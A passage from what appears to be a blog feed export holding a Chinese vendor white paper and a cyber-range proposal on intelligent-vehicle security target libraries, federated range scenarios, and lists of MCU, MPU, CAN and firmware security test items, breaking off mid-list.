靶标flag值：每个靶标都有一个唯一的标识符，用于在攻击者成功攻击该靶标时进行识别和验证。</p><p>2. 攻击手段：描述攻击者可以使用的方法、技术或漏洞来攻击该靶标，例如网络扫描、缓冲区溢出、跨站脚本等。</p><p>3. 得分点：指定攻击者在成功攻击该靶标时可以获得的得分或奖励，用于评估攻击者的技能和成就。</p><p>4. 是否为公用靶标：指明该靶标是否为公开可用的靶标，供多个安全测试人员或团队进行攻击和评估。</p><p>5. 靶标所属靶场：将靶标归属到特定的靶场或安全测试环境中，以便组织和管理相关的靶标和攻击活动。</p><p>6. 访问形式：描述攻击者可以访问该靶标的方式，如远程访问、本地访问、特定权限要求等。</p><p>7. 访问地址：指定攻击者可以使用的访问地址或网络位置来访问该靶标，例如IP地址、域名或URL。</p><p>通过提供这些信息，联邦靶标构想可以帮助安全测试人员或团队识别和选择适合其需求的具体靶标，并进行有针对性的攻击和评估活动。</p><p><strong>联邦互联场景：</strong></p><p>联邦互联场景是一个包含以下要素的环境描述：</p><p>1. 场景的拓扑描述：描述联邦互联环境中各个节点之间的连接和布局。包括节点名称、地址和访问端口等信息，用于指定节点的身份和访问方式。</p><p>2. 联邦靶场区域描述：指定联邦互联环境中的靶场区域的位置和特征。包括靶场所在地的描述，可以是一个实际的物理位置或虚拟环境；还包括靶标区域和网段划分，用于指定靶标所在的特定区域和相关的网络地址范围。</p><p>通过提供这些信息，联邦互联场景描述可以帮助组织和安全测试人员理解联邦互联环境的整体结构和组成部分。拓扑描述提供了节点之间的连接方式和访问信息，而联邦靶场区域描述则指定了靶场的位置和靶标所在的特定区域，为安全测试和攻击活动提供了目标和范围。这些描述有助于规划和组织联邦互联场景中的安全测试和评估活动。</p><p><strong>联邦互联场景协同：</strong></p><p>联邦互联场景协同方案可以包括以下要素：</p><p>1. 单场景协同：描述一个场景中的协同攻击方式。这包括传统攻击方式的描述，例如网络扫描、漏洞利用、社会工程等。同时，还描述场景与其他靶场协同时采用的攻击方式和攻击步骤。</p><p>2. 参考实施方案：提供一个参考的实施方案，包括节点和拓扑情况的描述，节点之间的通信协议，flag分布情况以及获取flag所需的攻击方式的简述。</p><p>在实施方案中，可以包括以下内容：</p><p>- 节点和拓扑情况：描述联邦互联场景中涉及的各个节点的名称、地址和拓扑关系，以及节点之间的连接方式和通信方式。</p><p>- 节点之间的通信协议：指定节点之间进行通信时所使用的协议，例如TCP/IP、HTTP、SSH等。</p><p>- Flag分布情况：描述flag在联邦互联场景中的分布情况，包括哪些节点上存储了flag以及它们的位置和访问方式。</p><p>- 获取flag所需的攻击方式简述：简要描述攻击者需要采用的攻击方式来获取flag，例如漏洞利用、密码破解、网络嗅探等。</p><p>通过提供这些信息，联邦互联场景协同方案可以帮助安全测试人员或团队理解和规划在联邦互联环境中的协同攻击方式和步骤。参考实施方案提供了具体的节点和拓扑情况，以及攻击者需要采用的方式来获取flag，有助于指导实际的安全测试和评估活动。</p><p><strong>联邦互联网络规划：</strong></p><p>联邦互联网络规划涉及以下要素：</p><p>1. IP地址段规划：对整体联邦互联场景中的网络进行IP地址段规划。这包括为各个节点、子网和靶场分配IP地址段，确保网络中的设备和系统能够正确地进行通信和访问。</p><p>2. VLAN划分：根据需要，对联邦互联场景中的网络进行VLAN划分。VLAN可以将网络划分为多个虚拟局域网，提供隔离和安全性。通过划分VLAN，可以对不同的节点、子网或靶场进行逻辑隔离，以保护网络的安全性和性能。</p><p>3. VPN划分规划：对联邦互联场景中的VPN进行划分规划。VPN（虚拟专用网络）可以提供安全的远程访问和通信，用于连接不同地理位置的节点和靶场。通过划分VPN，可以确保在联邦互联环境中的通信和数据传输是加密和安全的。</p><p>网络连接规划设计图可以提供整体联邦互联场景的网络拓扑图和连接方式。它显示了各个节点、子网和靶场之间的连接关系，以及它们所使用的IP地址段、VLAN划分和VPN划分规划。这样的设计图可以帮助网络管理员和安全团队更好地理解和管理联邦互联场景中的网络架构和连接配置。</p><p><strong>其他内容：</strong></p><p>根据方案在靶场中创建联邦互联场景模板工程；</p><p>3年内提供不少于2场联邦互联支持，支持内容包含但不限于方案筹划，现场准备，技术支持，执裁等。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="posts/0/"/>
      <url>posts/0/</url>
      
        <content type="html"><![CDATA[<p><strong>国利网安智能汽车网络靶场资源库技术白皮书</strong></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f0f87ae178beabba34ab47812799c4cb.png"></p><p>浙江国利网安科技有限公司</p><p>目 录</p><p>1 智能汽车网络靶场资源库 1</p><p>1.1 总体概述 1</p><p>1.2 系统概述 1</p><p>1.3 靶场资源库总体要求 1</p><p>1.3.1 靶标库 1</p><p>1.3.2 知识库 1</p><p>1.3.3 用例库 1</p><p>1.3.4 工具库 2</p><p>1.4 交付文档 2</p><p>2 智能汽车网络靶场靶标库 3</p><p>2.1 靶标库总体概述 3</p><p>2.2 靶标库开发 3</p><p>2.2.1 MCU靶标开发方案 3</p><p>2.2.2 MPU靶标库开发方案 6</p><p>2.2.3 E/E架构通信网络靶标开发方案 15</p><p>2.2.4 车联网安全场景靶标开发方案 19</p><p>2.2.5 ADAS靶标开发方案 22</p><p>2.2.6 V2X靶标开发方案 24</p><p>3 智能汽车网络靶场知识库 26</p><p>3.1 智能汽车网络靶场漏洞库 26</p><p>3.1.1 靶场漏洞库方案 26</p><p>3.1.2 智能汽车网络靶场威胁情报库 29</p><p>3.1.3 智能汽车网络靶场事件库 34</p><p>3.1.4 智能汽车网络靶场资产库 35</p><p>3.1.5 智能汽车网络靶场攻击者库 37</p><p>3.1.6 智能汽车网络靶场治理资源库 38</p><p>3.1.7 智能汽车网络靶场IP地址库 40</p><p>3.1.8 人才培养 41</p><p>4 智能汽车网络靶场测试用例库 49</p><p>4.1 总体概述 49</p><p>4.2 测试用例开发 49</p><p>4.3 测试策略及测试规范开发方案 50</p><p>4.4 用例库 52</p><p>4.4.1 零部件和集成测试用例库方案 52</p><p>4.4.2 整车用例库方案 56</p><p>4.5 测试策略及测试规范开发交付物 61</p><h1 id="智能汽车网络靶场资源库"><a href="#智能汽车网络靶场资源库" class="headerlink" title="智能汽车网络靶场资源库"></a>智能汽车网络靶场资源库</h1><h2 id="总体概述"><a href="#总体概述" class="headerlink" title="总体概述"></a>总体概述</h2><p>我司为本项目提供的靶场资源库包含靶场提供靶标、漏洞、威胁情报、测试用例、测试工具等，可以再在实际应用中来满足靶场开展测试验证、安全运营、攻防演练的资源，帮助企业持续降低目标风险，避免由于信息安全性问题而带来的安全风险，降低在运作过程中可能支付的信息安全缺陷损失成本，同时避免安全隐患。</p><h2 id="系统概述"><a href="#系统概述" class="headerlink" title="系统概述"></a>系统概述</h2><p>我司按要求，提供以下资源库内容：</p><p>靶场资源库包含靶标库、漏洞库、威胁情报库、测试数据库、工具库。</p><p>靶标库：涵盖车端、通信网络、联网业务平台的虚拟及实物仿真靶标</p><p>漏洞库：知识图谱融合漏洞、威胁情报、安全事件和资产等大数据信息，基于机器学习构建攻击画像</p><p>威胁情报库：收集全球不同来源的情报及网络数据，包括IP信誉、域名信誉、文件信誉、APT跟踪、历史活跃信息</p><p>用例库：包含整车、零部件、业务系统测试用例。</p><p>工具库：基于实验室现有测试工具进行升级完善，涵盖云、管、端及数据安全的测试工具，支持将工具统一接入、分类分级管理和自动执行和数据回收。</p><h2 id="靶场资源库总体要求"><a href="#靶场资源库总体要求" class="headerlink" title="靶场资源库总体要求"></a>靶场资源库总体要求</h2><h3 id="靶标库"><a href="#靶标库" class="headerlink" title="靶标库"></a>靶标库</h3><p>我司所提供的智能汽车网络靶场靶标库完全涵盖车端、通信网络、联网业务平台的虚拟及实物仿真靶标。靶标库应包含MCU靶标、MPU靶标、E/E架构通信网络靶标、车联网安全场景靶标、ADAS靶标、V2X靶标，同时支持根据客户的需求定制符靶标场景。</p><h3 id="知识库"><a href="#知识库" class="headerlink" title="知识库"></a>知识库</h3><p>我司所提供的靶场知识库支持与靶场、汽车安全运营平台对接，实现关联分析能力、场景化分析能力，提高告警处置。测试人员通过靶场和汽车全运营平台可对知识库数据进行查看，并对数据进行维护管理。</p><h3 id="用例库"><a href="#用例库" class="headerlink" title="用例库"></a>用例库</h3><p>我司所提供的基于靶场的信息安全渗透测试的依据即是用例库，作为XXXX智能汽车网络靶场用例库，包含零部件用例库及整车用例库。内容包含常规检测、硬件检测、固件检测、系统安全检测、应用安全检测、数据安全检测、接口安全检测、通信安全检测、日志安全检测、业务安全检测等。</p><h3 id="工具库"><a href="#工具库" class="headerlink" title="工具库"></a>工具库</h3><p>我司所提供的智能汽车网络靶场工具库包含数据安全测试工具、系统安全测试工具、业务安全测试工具、硬件测试工具等，可覆盖零部件、台架、整车相关的合规、功能及渗透测试，这些测试覆盖车WP29 R155、 WP29 R156、《汽车软件升级通用技术要求》、《汽车整车信息安全技术要求》等。</p><h2 id="交付文档"><a href="#交付文档" class="headerlink" title="交付文档"></a>交付文档</h2><p>我司在项目交付时，提供靶场资源库部分交付包含以下文档，若在交付过程中，甲方有其他需求，我司可与甲方进行商议，交付其他符合甲方预期的文档。</p><table><thead><tr><th>序号</th><th>所属系统</th><th>文档名称</th><th>数量</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>靶场资源库</td><td>密码测试工具使用及维护手册</td><td>1套</td><td>文档</td></tr><tr><td>2</td><td></td><td>V2X安全测试工具使用及维护手册</td><td>1套</td><td>文档</td></tr><tr><td>3</td><td></td><td>数据安全测试工具使用及维护手册</td><td>1套</td><td>文档</td></tr><tr><td>4</td><td></td><td>业务安全测试工具使用及维护手册</td><td>1套</td><td>文档</td></tr><tr><td>5</td><td></td><td>系统安全测试工具使用及维护手册</td><td>1套</td><td>文档</td></tr><tr><td>6</td><td></td><td>智能汽车网络靶场MCU靶标开发手册</td><td>1套</td><td>文档</td></tr><tr><td>7</td><td></td><td>智能汽车网络靶场MPU靶标开发手册</td><td>1套</td><td>文档</td></tr><tr><td>8</td><td></td><td>智能汽车网络靶场E/E架构通信网络靶标开发手册</td><td>1套</td><td>文档</td></tr><tr><td>9</td><td></td><td>智能汽车网络靶场车联网安全场景靶标开发手册</td><td>1套</td><td>文档</td></tr><tr><td>10</td><td></td><td>测试用例库</td><td>1套</td><td>文档</td></tr><tr><td>11</td><td></td><td>测试作业指导书</td><td>1套</td><td>文档</td></tr></tbody></table><h1 id="智能汽车网络靶场靶标库"><a href="#智能汽车网络靶场靶标库" class="headerlink" title="智能汽车网络靶场靶标库"></a>智能汽车网络靶场靶标库</h1><h2 id="靶标库总体概述"><a href="#靶标库总体概述" class="headerlink" title="靶标库总体概述"></a>靶标库总体概述</h2><p>汽车快速智能化带来了对网络安全的迫切需求。网络安全是汽车智能化发展的核心要素，没有网络安全的保障，智能汽车就难以得到快速发展与应用。对汽车进行破解或是安全攻击的事件已经出现，且可能的后果还相当严重。网络安全事件将可能演变成社会安全，甚至国家安全问题。</p><p>针对智能汽车网络安全问题，现阶段通过对零部件、台架、整车进行渗透测试的方式无法满足持续开发集成与验证测试的需求，通过智能汽车网络靶场开发构建零部件、台架、整车的虚拟和实物靶标，满足持续开发集成与验证的需求。</p><p>智能汽车网络靶场靶标库涵盖车端、通信网络、联网业务平台的虚拟及实物仿真靶标。靶标库包含MCU靶标、MPU靶标、E/E架构通信网络靶标、车联网安全场景靶标、ADAS靶标、V2X靶标。</p><h2 id="靶标库开发"><a href="#靶标库开发" class="headerlink" title="靶标库开发"></a>靶标库开发</h2><h3 id="MCU靶标开发方案"><a href="#MCU靶标开发方案" class="headerlink" title="MCU靶标开发方案"></a>MCU靶标开发方案</h3><p>我司为本项目提供MCU靶标开发，所开发的参数满足要求。</p><p>在MCU靶标开发过程中，我司遵循产品定制开发的基本原则，基于MCU的特性进行靶标开发，按照甲方需求，完成相应的靶标开发工作。</p><ol><li>甲方需求分析</li></ol><p>确定MCU靶标的开发目标，在智能网联汽车中MCU的应用范围和作用，继而确定开发的主要内容。根据开发所需的主要内容，确认MCU靶标的功能和性能，采用适合的硬件，可有助于完成相应实验任务。</p><ol><li>硬件设计</li></ol><p>选择适合目标市场和应用领域的MCU芯片。</p><p>设计电路原理图和PCB布局，确保电路稳定性和可靠性。</p><p>考虑外设接口、存储器需求和电源管理等方面的设计。</p><p>把MCU靶标信息的记录，包含靶标名称、靶标功能场景、靶标已知威胁漏洞信息。</p><p>硬件可满足与现有ECU开发工具适配仿真RTE层与应用层。</p><ol><li>固件开发</li></ol><p>在进行固件开发中，设计基础软件层，使用合适的集成开发环境（IDE）和编程语言进行固件开发。要满足与现有ECU开发工具适配仿真RTE层与应用层。</p><p>编写启动代码和驱动程序，确保MCU正常启动和与外设的通信，通过零部件的升级包制作靶标镜像。</p><p>开发应用程序逻辑，实现所需功能和性能要求。</p><p>进行调试和测试，确保固件的正确性和稳定性。</p><p>可满足多种MCU的模拟，包含SRS、DDM、SCU_FL、EPS、RWS、RBS等。</p><p>支持通过零部件的升级包制作靶标镜像。</p><ol><li>软件开发</li></ol><p>开发与MCU靶标交互的上位机软件或移动应用程序。</p><p>设计用户界面，实现与MCU的数据交互和控制功能。</p><p>考虑数据传输和存储的安全性和稳定性。</p><p>MCU靶标对实物的还原包含基础软件层、运行环境、固件、应用程序，对以上内容虚拟化覆盖率可达到100%。</p><p>靶标覆盖85%以上固件安全检测项，包含固件算法分析检测，密钥硬编码检测，服务接口访问安全检测，隐藏后门检测，敏感数据检测，配置文件安全检测，固件加固安全检测。</p><ol><li>集成和测试</li></ol><p>将硬件和固件进行集成，确保它们能够正常工作。我们的MCU靶标对实物的还原至含有基础软件层、运行环境、固件、应用程序，通过制作的靶标，可以对以上内容虚拟化达到100%覆盖率。</p><p>提供的靶标能够100%完全覆盖车内通信安全检测中，而且还不涉及硬件外设的测试项，所包含与CAN上车内控制单元的安全策略检测，与其他ECU通信的安全策略检测等诸多检测项。</p><p>进行功能测试和性能测试，验证MCU靶标的功能和性能是否符合要求。</p><p>修复和优化可能存在的问题，确保产品的质量和稳定性。</p><p>靶标100%覆盖车内通信安全检测中不涉及硬件外设的测试项，包含与CAN上车内控制单元的安全策略检测，与其他ECU通信的安全策略检测。我方还将提供的靶标应覆盖85%以上固件安全检测项，争取尽最大覆盖所有内容，包含固件算法分析检测、密钥硬编码检测、服务接口访问安全、隐藏后门、敏感数据、配置文件安全、固件加固安全等。</p><ol><li>部署和调试</li></ol><p>根据需求进行批量生产，确保产品的一致性和可靠性。</p><p>配置和安装MCU靶标到目标系统中。</p><p>提供相应的技术文档和培训，以便用户正确使用和维护MCU靶标。</p><ol><li>后续支持和维护</li></ol><p>提供技术支持和维护服务，及时解决用户的问题和反馈。</p><p>定期进行固件和软件的更新和升级，以改进功能和修复漏洞。</p><ol><li>产品彩页</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c354351211a6fd9663b5a531734d4c21.png"></p><ol><li><p>MCU靶标开发功能参数</p></li><li><p>支持MCU靶标信息的记录，包含靶标名称、靶标功能场景、靶标已知威胁漏洞信息；</p></li><li><p>支持基础软件层；</p></li><li><p>支持与现有ECU开发工具适配仿真RTE层与应用层；</p></li><li><p>支持多种MCU的模拟，包含SRS、DDM、SCU_FL、EPS、RWS、RBS等；功能截图证明如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7a8ba55271a25a25a7ae0134d9324ec4.png"></p></li><li><p>支持通过零部件的升级包制作靶标镜像；</p></li><li><p>提供靶标制作方法教程；</p></li><li><p>提供靶标制作培训；</p></li><li><p>初始靶标10个；</p></li><li><p>提供50个靶标的开发；</p></li><li><p>MCU靶标对实物的还原包含基础软件层、运行环境、固件、应用程序，对以上内容虚拟化覆盖率可达到100%；</p></li><li><p>提供的靶标覆盖85%以上固件安全检测项，包含固件算法分析检测；</p></li><li><p>支持密钥硬编码检测；</p></li><li><p>支持服务接口访问安全检测；</p></li><li><p>支持隐藏后门检测；</p></li><li><p>支持敏感数据检测；</p></li><li><p>支持配置文件安全检测；</p></li><li><p>支持固件加固安全检测；</p></li><li><p>提供的靶标100%覆盖车内通信安全检测中不涉及硬件外设的测试项，包含与CAN上车内控制单元的安全策略检测；</p></li><li><p>支持靶标与其他ECU通信的安全策略检测；</p></li><li><p>支持三年内免费提供靶标开发支持。</p></li></ol><h3 id="MPU靶标库开发方案"><a href="#MPU靶标库开发方案" class="headerlink" title="MPU靶标库开发方案"></a>MPU靶标库开发方案</h3><p>我司为本项目提供MPU靶标开发，所开发的参数满足要求。</p><p>在MPU靶标开发过程中，我司遵循产品定制开发的基本原则，基于MPU的特性进行靶标开发，按照甲方需求，完成相应的靶标库开发工作。</p><ol><li>靶标库需求分析</li></ol><p>确定MPU靶标的开发目标，在智能网联汽车中MPU的应用范围和作用，继而确定开发的主要内容。根据开发所需的主要内容，确认MPU靶标的功能和性能，采用适合的硬件，完成基础GPU模拟、内存模拟、I/O设备模拟。</p><ol><li>架构设计</li></ol><p>设计MPU靶标库的软件架构，包括模块划分和接口定义，在做靶标库设计中，需要考虑可移植性和可扩展性，以支持不同的MPU芯片和应用场景、合适的编程语言和开发工具。首先需要满足的内容为能实现基础GPU模拟、内存模拟、I/O设备模拟，并通过动态二进制转换来模拟CPU，整个靶标库的基础环境支持操作系统的模拟，能够将MPU操作系统制作为虚拟镜像，并在靶场基础平台中部署运行，且不依赖硬件。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c9a0aa130875b533791ca987b5235d1f.png" alt="1694319821279"></p><p>靶标库架构图</p><ol><li>驱动程序开发</li></ol><p>开发与MPU芯片相关的底层驱动程序，包括初始化、配置和控制等。实现对MPU芯片的各种功能和特性的访问接口。确保能覆盖FEEA2.0架构下的TBOX、IVI、网关、仪表等，并完成对FEEA3.0架构域控制器靶标的适配，将未来架构中央处理单元靶标。进行驱动程序的调试和测试，确保其正确性和稳定性。</p><p>驱动程序设计可以通过动态二进制转换来模拟CPU，将操作系统的模拟，通过能够将MPU操作系统制作为虚拟镜像，并在靶场基础平台中部署运行，能够实现完全不依赖硬件的配置。还可以在系统中运行应用程序，如APK文件等。</p><p>还能通过零部件提取制作靶标镜像，通过其升级包制作靶标镜像。</p><ol><li>中间件开发</li></ol><p>开发中间件模块，提供常用的功能和算法支持，包括任务调度、通信协议、文件系统、图形库等，如支持未来架构中央处理单元靶标，支持x86/arm（不限于arm32、arm64）架构靶标，可通过零部件提取制作靶标镜像，通过零部件的升级包制作靶标镜像，qcow2格式的靶标镜像，支持操作系统、APP、网络通信、CAN总线通信、文件系统的虚拟化。</p><p>考虑资源占用和性能优化，以满足不同应用场景的需求，实现靶标支持直接导入靶场部署并运行。</p><p>提供支撑qemu的靶标制作环境，和包含靶标文件系统提取工具的靶标制作工具，实现x86架构靶标、arm（不限于arm32、arm64）架构靶标，其靶标可支持直接导入靶场部署并运行，并提供靶标的初始20个，协助完成50个靶标的开发。</p><p>靶标的CPU、内存、硬盘资源可自定义配置，并对配置做最低要求限制，避免靶标因资源不足出现系统资源占用率过高，应用无法正常运行等</p><ol><li>应用程序开发</li></ol><p>开发示例应用程序，展示MPU靶标库的功能和性能，实现常见的应用场景，如MPU靶标对实物还原度包括系统目录、shell界面、文件系统、磁盘分区、通用网卡驱动、应用程序，对以上内容虚拟化覆盖率应达到100%。</p><p>提供的靶标应覆盖85%以上固件安全检测项，包含固件算法分析检测、密钥硬编码检测、服务接口访问安全、隐藏后门；敏感数据、配置文件安全、固件加固安全。</p><ol><li>固件算法分析检测</li></ol><p>我们的服务将深入分析固件中使用的各种算法，包括加密算法、散列函数、签名验证等。这一检测旨在确保算法的实现没有缺陷，且选择的算法能够抵御当前已知的攻击方法。我们会评估算法的强度，检查是否存在过时的或已被破解的算法使用，以及算法实现是否存在漏洞。</p><ol><li>密钥硬编码检测</li></ol><p>硬编码密钥是固件安全中的一个常见风险点。我们的检测将识别和评估固件中可能硬编码的密钥，包括但不限于私钥、公钥、密码等。硬编码的密钥可能会被攻击者发现并利用，从而破坏系统的安全性。我们的服务将确保密钥的管理和存储机制是安全的，以及密钥生成和更新过程符合最佳安全实践。</p><ol><li>服务接口访问安全</li></ol><p>服务接口是攻击者常见的攻击目标，我们的检测将确保固件中的所有服务接口都经过了严格的安全审计。这包括对Web服务接口、API端点、远程管理接口等进行全面的安全配置检查，确保它们都有适当的认证和授权机制，以及对数据传输加密的支持。</p><ol><li>隐藏后门检测</li></ol><p>隐藏后门可能是由于设计疏忽或恶意植入。我们的检测服务将使用先进的技术和方法来识别固件中可能存在的后门。这包括对固件的代码分析、行为监控以及异常通信模式的检测，以发现任何可能被植入的、未经授权的访问点。</p><ol><li>敏感数据和配置文件安全</li></ol><p>固件中的敏感数据和配置文件需要得到特别保护。我们的检测服务将评估这些信息的保护措施，确保敏感数据如用户凭证、配置设置等被适当地加密和安全地存储。此外，我们还会检查配置文件不会被未经授权的用户访问或修改。</p><ol><li>固件加固安全</li></ol><p>固件加固是指采取措施提高固件对抗攻击的能力。我们的检测服务将评估固件加固的程度，包括操作系统的安全配置、应用程序的安全性、启动过程的安全性以及其他防护措施。这也包括对固件进行定期的安全更新和补丁管理，以及确保固件在面对新出现的威胁时能够迅速响应。</p><p>提供的靶标覆盖80%以上系统安全检测项，包含Root检测，Root防御、系统修复、系统防篡改等检测、系统启动安全检测、系统漏洞检测等、权限等级设置检查、内存隔离安全性测试、应用授权管理安全性测试、系统服务安全性测试。</p><ol><li>Root检测与Root防御</li></ol><p>我们的服务包括对系统的Root访问权限进行深入检测，以确定是否有未授权或恶意的Root访问行为。Root权限可以提供对系统最深层次的控制，因此防御措施至关重要。我们评估系统的Root防御能力，确保有足够的安全防护措施来抵御Root级别的攻击和滥用。</p><ol><li>系统修复与系统防篡改检测</li></ol><p>系统的完整性对于保障运行安全至关重要。我们的检测服务会评估系统的自我修复能力，检查是否有自动修复受损文件和配置的机制。同时，我们会进行系统防篡改检测，确保关键系统文件和配置不会被未授权的更改。</p><ol><li>系统启动安全检测</li></ol><p>系统启动过程是攻击者常见的攻击目标，因为在这个阶段系统的防御措施可能尚未完全启动。我们的检测服务将验证启动加载器的安全性，包括固件保护和启动过程中的验证机制，确保系统启动时的完整性和安全性。</p><ol><li>系统漏洞检测</li></ol><p>我们的服务会定期扫描和识别系统中可能存在的已知漏洞，这包括操作系统、内核、服务和应用程序。通过使用最新的漏洞数据库和检测技术，我们能够及时发现并推荐相应的修复措施。</p><ol><li>权限等级设置检查</li></ol><p>适当的权限等级设置对于维护系统安全至关重要。我们的检测服务将检查系统中的用户帐户、进程和服务的权限设置，确保它们都符合最小权限原则，从而减少潜在的安全风险。</p><ol><li>内存隔离安全性测试</li></ol><p>内存隔离是防止恶意程序访问或修改其他程序数据的重要安全机制。我们的服务会测试系统的内存隔离机制，包括地址空间布局随机化（ASLR）和数据执行防止（DEP）等技术，以确保内存安全性。</p><ol><li>应用授权管理安全性测试</li></ol><p>应用程序的授权管理是控制应用访问系统资源的关键。我们的测试服务会评估应用授权管理的安全性，确保应用程序只能访问其授权的资源，防止越权行为。</p><ol><li>系统服务安全性测试</li></ol><p>系统服务是攻击者的另一个目标，因为它们通常具有较高的权限并在后台运行。我们的服务将测试这些服务的安全性，检查服务配置、权限设置以及与其他系统组件的交互是否存在安全隐患。</p><p>提供的靶标应覆盖90%以上数据存储安全检测，包含数据加密存储检查，如配置参数、日志数据等敏感信息加密存储、数据完整性检测、敏感数据访问控制检测、数据存取错误反馈检测，非硬件存储密钥管理检测，敏感数据残留检测等。</p><ol><li>数据加密存储检查</li></ol><p>我们会检查所有敏感信息，包括配置参数和日志数据等，是否都采用了强加密算法进行存储。这包括对数据在传输和静态时的加密措施进行验证，以确保即使数据被未经授权的人员访问，也无法被解读。</p><ol><li>数据完整性检测</li></ol><p>数据完整性检测确保数据在存储和传输过程中未被篡改。我们使用校验和、数字签名等技术来验证数据的完整性。任何数据的非授权修改都会被检测系统识别，并触发相应的安全警报。</p><ol><li>敏感数据访问控制检测</li></ol><p>我们的服务包括验证数据访问控制策略的有效性，确保只有授权用户才能访问敏感数据。这涉及到对用户身份验证、角色基础访问控制（RBAC）和强制访问控制（MAC）策略的审查和测试。</p><ol><li>数据存取错误反馈检测</li></ol><p>为了防止错误的反馈信息泄露敏感数据，我们的检测服务会评估系统对于数据存取错误的处理方式。这包括错误消息的内容，确保它们不会暴露敏感信息或提示潜在的攻击者有关系统内部结构的信息。</p><ol><li>非硬件存储密钥管理检测</li></ol><p>密钥管理是加密存储的核心部分，我们的服务会检查非硬件存储的密钥管理策略和实践，包括密钥的生成、分发、存储、使用、更换和销毁过程，确保密钥管理的全生命周期安全。</p><ol><li>敏感数据残留检测</li></ol><p>在数据被删除或设备被重新用于其他目的之前，我们会检测设备上是否还残留有敏感数据。我们使用各种技术手段，如数据擦除标准和残留数据扫描工具，来确保敏感数据被彻底删除，避免数据泄露。</p><p>提供的靶标应100%覆盖车内通信安全检测，包含与CAN上车内控制单元的安全策略检测、与其他ECU通信的安全策略检测、CAN报文抗重放测试、CAN总线模糊测试、诊断访问信息安全测试、诊断数据包防御信息安全测试、诊断模糊测试、诊断复位测试、诊断读写服务测试、诊断动作指令测试、诊断通讯控制服务测试、车载以太网服务认证测试、车载以太网重放攻击测试、车载以太网未授权接入、车载以太网模糊测试、车载以太网端口扫描、提供的靶标应100%覆盖日志检测，包含应用程序日志内容检测等等。以满足MPU靶标库在实验场景中的使用需求。</p><ol><li>车内控制单元与CAN通信的安全策略检测</li></ol><p>评估车辆内部网络中每个控制单元（ECU）的安全策略，确保它们能够抵御未授权访问和数据篡改。</p><ol><li>与其他ECU通信的安全策略检测</li></ol><p>检查ECU之间的通信安全措施，包括身份验证和授权协议，确保通信过程的安全性。</p><ol><li>CAN报文抗重放测试</li></ol><p>执行抗重放测试来验证系统是否能够检测和阻止重放攻击，其中旧的通信报文被重新发送以产生不正当的行为。</p><ol><li>CAN总线模糊测试</li></ol><p>通过向CAN总线发送异常或随机数据来测试系统的鲁棒性，确保系统能够妥善处理无效或异常的输入。</p><ol><li>诊断访问信息安全测试</li></ol><p>验证诊断访问的安全性，确保只有授权的操作能够执行，并且敏感信息得到保护。</p><ol><li>诊断数据包防御信息安全测试</li></ol><p>测试和评估诊断数据包的安全防御机制，确保数据包在传输过程中不会被截获或篡改。</p><ol><li>诊断模糊测试</li></ol><p>对诊断服务进行模糊测试，以检查系统对异常或意外输入的处理能力。</p><ol><li>诊断复位测试</li></ol><p>评估诊断复位功能的安全性，确保系统能够安全地恢复到预设状态。</p><ol><li>诊断读写服务测试</li></ol><p>验证读写服务的安全性，确保只有授权的操作才能访问和修改ECU的配置或数据。</p><ol><li>诊断动作指令测试</li></ol><p>测试动作指令的执行安全性，确保这些指令不会被恶意利用来对车辆进行不当操作。</p><ol><li>诊断通讯控制服务测试</li></ol><p>评估诊断通信控制服务的安全性，确保通信机制不会被滥用。</p><ol><li>车载以太网服务认证测试</li></ol><p>确保车载以太网服务实施了适当的认证机制，防止未授权的访问。</p><ol><li>车载以太网重放攻击测试</li></ol><p>测试车载以太网系统是否能够抵御重放攻击，保证通信的时效性和安全性。</p><ol><li>车载以太网未授权接入测试</li></ol><p>检测车载以太网系统对未授权接入的防护能力，确保网络的封闭性。</p><ol><li>车载以太网模糊测试</li></ol><p>对车载以太网进行模糊测试，以验证系统对异常数据的处理能力。</p><ol><li>车载以太网端口扫描</li></ol><p>执行端口扫描以发现车载以太网系统中可能存在的未加固的端口或服务。</p><ol><li>日志检测</li></ol><p>全面检测系统日志，包括应用程序日志，以确保日志内容的完整性和安全性，同时验证日志记录机制是否能够有效地记录所有关键事件。</p><p>我司在提供技术开发和服务的同时，还提供开发文档和示例代码，以便甲方快速上手和开发自己的应用。</p><ol><li>测试和验证</li></ol><p>在完成相关开发工作后，进行功能测试和性能测试，验证MPU靶标库的功能和性能是否符合要求。针对本项目所提到的相关要求我们将进行逐一的验证测试，使用各种测试工具和设备进行全面的测试覆盖。在测试过程中所出现的问题，我们将通过我司的专业团队进行修复和优化，并排除可能存在的问题，确保库的质量和稳定性符合和甲方要求。</p><ol><li>文档和支持</li></ol><p>提供详细的技术文档，包括库的使用说明和接口文档。</p><p>提供技术支持和培训，解答用户的问题和提供帮助。</p><ol><li>产品彩页</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/8de1b16a427b5961b013bb18c2692be9.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/2b6b8fe56c06e2efcbb786813eff8892.png"></p><ol><li>MPU靶标库功能参数</li><li>提供基础GPU模拟、内存模拟、I/O设备模拟；</li><li>支持通过动态二进制转换来模拟CPU；</li><li>支持操作系统的模拟，能够将MPU操作系统制作为虚拟镜像，并在靶场基础平台中部署运行，且不依赖硬件；</li><li>支持在系统中运行应用程序，包含APK文件；</li><li>覆盖FEEA2.0架构下的TBOX、IVI、网关、仪表等；</li><li>支持FEEA3.0架构域控制器靶标；</li><li>支持未来架构中央处理单元靶标；</li><li>支持通过零部件提取制作靶标镜像；</li><li>支持通过零部件的升级包制作靶标镜像；</li><li>支持qcow2格式的靶标镜像；</li><li>支持操作系统、APP、网络通信、CAN总线通信、文件系统的虚拟化；</li><li>支持x86架构靶标；</li><li>支持arm（不限于arm32、arm64）架构靶标；</li><li>靶标支持直接导入靶场部署并运行；</li><li>靶标的CPU、内存、硬盘资源可自定义配置，并对配置做最低要求限制，避免靶标因资源不足出现系统资源占用率过高，应用无法正常运行等；</li><li>提供靶标制作方法教程；</li><li>提供靶标制作培训；</li><li>初始靶标20个；</li><li>提供50个